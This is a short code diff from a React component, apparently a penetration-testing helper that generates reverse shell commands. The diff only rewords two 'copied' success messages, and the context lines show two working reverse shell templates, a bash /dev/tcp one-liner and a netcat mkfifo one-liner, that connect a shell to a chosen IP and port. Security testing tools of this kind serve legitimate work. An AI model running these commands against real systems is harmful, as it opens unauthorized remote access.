@@ -20,10 +20,10 @@ export default function ReverseShell () {
         setValues( { ...values, [ name ]: event.target.value } );
     };
     const successInfoReverseShell = () => {
-        message.success( 'Your reverse shell has been copied' );
+        message.success( 'Your reverse shell has been copied successfully !' );
     };
     const successInfoEncodeURL = () => {
-        message.success( 'Reverse shell URI encoded has been copied' );
+        message.success( 'Reverse shell URI encoded has been copied successfully !' );
     };
     const bash_rshell = `bash -c 'exec bash -i &>/dev/tcp/${ values.ip }/${ values.port } <&1'`;
     const netcat_rshell = `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ values.ip } ${ values.port } >/tmp/f`;
